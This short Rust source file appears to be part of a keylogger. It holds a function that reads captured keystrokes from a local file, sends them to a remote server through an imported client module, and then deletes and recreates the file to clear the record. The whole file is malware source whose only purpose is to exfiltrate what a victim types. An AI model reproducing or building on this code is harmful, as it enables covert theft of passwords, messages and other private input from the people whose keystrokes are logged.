use std::time::Duration;
use std::sync::Mutex;
use std::fs::{OpenOptions,remove_file, File, read_to_string};
use std::thread;
mod send_keystrokes_as_client;
use send_keystrokes_as_client::send_keystroke_to_server;

pub fn send_and_reset_file() -> Result<(),std::io::Error> {
    let contents = read_to_string("keystrokes.txt")?;
    send_keystroke_to_server(contents);
    remove_file("keystrokes.txt");
    File::create("keystrokes.txt");
    Ok(())
}